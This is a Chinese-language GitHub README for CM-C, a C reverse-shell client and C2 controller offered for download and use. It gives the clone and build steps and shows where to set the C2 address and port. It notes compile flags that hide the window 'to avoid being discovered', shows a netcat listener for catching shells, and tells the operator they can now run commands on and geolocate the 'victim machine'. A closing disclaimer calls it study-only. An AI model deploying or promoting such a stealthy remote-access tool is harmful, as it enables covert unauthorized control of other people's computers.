# [CM-C](https://github.com/XiaoZhang-qd/cm-c "项目链接")
## 项目介绍
[CM-C](https://github.com/XiaoZhang-qd/cm-c "项目链接")是一个由C语言编写的反向Shell控制端和受控端。
用gcc或者clang、cl等等的编译器来编译后可直接运行。
控制端可以使用NetCat的nc或者ncat等等作为控制端（但是会无法单个端口控制）。
已在[makefile](./makefile)里进入隐藏窗口和减少文件体积的编译命令，可避免被发现。
本项目可支持所以操作系统编译并执行

![CM-M](./CM-C.png "LOGO")

### 已经通过测试后可用的操作系统
- Windows
- Linux
- Macos(Datwin)

### 复制克隆命令:

```git
git clone https://github.com/XiaoZhang-qd/CM-C
```
### 进入项目目录:

```cd
cd CM-C
```
### 修改默认配置
- 在main.c的源代码里修改C2_IP_DOMAIN和C2_PORT为你的控制端IP/域名和端口(如127.0.0.1和4444):
```c
// 默认配置，可以根据需要修改 C2/域名 的 IP 和端口
#ifndef C2_IP
    #define C2_IP_DOMAIN "127.0.0.1"
#endif
#ifndef C2_PORT
    #define C2_PORT 4444
#endif
```
- 在server.c的源代码里修改START_IP和START_PORT为你要监听的IP和端口(如127.0.0.1和4444)(这个可以不用修改):
```c
// 默认配置，可以根据需要修改 C2 的监听 IP 和端口
#ifndef START_IP
    #define START_IP "127.0.0.1"
#endif
#ifndef START_PORT
    #define START_PORT 4444
#endif
```


#### 您可以直接使用make编译，它会要求你填入控制端的监听IP和与端口（默认IP为127.0.0.1，端口为4444）和受控端的连接控制端的监听IP/移民和端口（默认为127.0.0.1的IP，端口为4444）

- 编译受控端和控制端:
````makefile
make
````
> **注意**:***目前仅支持TCP协议。

> **注意：** 由于msys的特殊性，如果你用msys，输入完IP/域名和PORT后，需要再输入exit退出cmd终端，有知道怎么解决的请到[issue](https://github.com/XiaoZhang-qd/cm-c/issues/1)给作者，谢谢。

## 编译

- 你需要先有C语言编译工具链和make工具
- Windows 系统可用Microsoft Visual Studio (MSVC)、MinGW、MSYC（可能会需要依赖msys-1.0.dll）、MSYC2（可能会需要依赖msys-2.0.dll）、Cygwin（可能会需要依赖cygwin1.dll）、WSL的工具链等等，C语言编译工具（cl、gcc、clang、cc等等即可）
- 其他的系统（如Linux、macOS、BSD等等）如果有你需要先有C语言编译工具（gcc、clang、cc等等即可）和make工具可直接编译。

````makefile
make
````

## 操作方法
1. 在和受害机一样的系统上运行编译后的可执行文件。
2. 控制端可以使用NetCat的nc或者ncat等等作为控制端，连接到受害机的IP和端口。
3. 如(nc)：
````bash
nc -lp 4444
````
或者使用CM-C的控制端:
```
./CM-C-Server 127.0.0.1 4444
```

4. 受害机上线后，受控端会发来信息如：
````

   _____    __  __               _____
  / ____|  |  \/  |             / ____|
 | |       | \  / |   ______   | |
 | |       | |\/| |  |______|  | |
 | |____   | |  | |            | |____
  \_____|  |_|  |_|             \_____|

        CM-C-Client:mapp.exe
Version: 1.0.0, Build: 2026-05-30 13:11:46
[*] Disconnection count: 0
[+] Connected successfully.
-{2026-05-30 13:11:58}-{(mapp.scr)[C:\Users\usus\项目\CM-C]}->
````
5. 控制端可以输入命令，受害机会执行并返回结果。
6. 控制端可以输入exit和quit可以退出连接。
7. 已加入新功能在受害机上线后可输入ip-info得到受害机公网ip信息如：
```
-{2026-05-23 01:02:49}-{(mapp)[/root/neo/cm-c]}-> ip-info
Japan(JP)-103.151.173.201-+-103.151.173.201-
```
9. 输入cm-help可以获取帮助
10. 后续还会再加入更多功能，敬请期待。

- 现在你可以控制受害机啦！要注意[使用声明](#使用声明)哦。

## 有任何问题和建议，请[issue](https://github.com/XiaoZhang-qd/cm-c/issues/1)给作者，谢谢。

## 希望你能一个strt，谢谢

----------

## 使用声明
- 本项目仅用于学习和研究，不建议在生产环境中使用。
- 本项目不承担任何责任，不承担任何法律风险。
- 请在合法范围内使用本项目，不用于任何违法活动。
- 请在使用本项目时，遵守当地的法律和法规。

## Star History

<a href="https://www.star-history.com/?repos=xiaozhang-qd%2Fcm-c&type=timeline&logscale=&legend=bottom-right">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=xiaozhang-qd/cm-c&type=timeline&theme=dark&logscale&legend=top-left" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=xiaozhang-qd/cm-c&type=timeline&logscale&legend=top-left" />
   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=xiaozhang-qd/cm-c&type=timeline&logscale&legend=top-left" />
 </picture>
</a>

##### 后言
- 更新工具请用下面的命令（需要有git命令行工具:
```
make update
```
- 在[这里](https://github.com/XiaoZhang-qd/CM-C/releases/tag/S)可以快速下载 -
- 使用请遵守[GPL-3.0](./LICENSE "LICENSE")的开源协议
- [logo-html](./index.html)
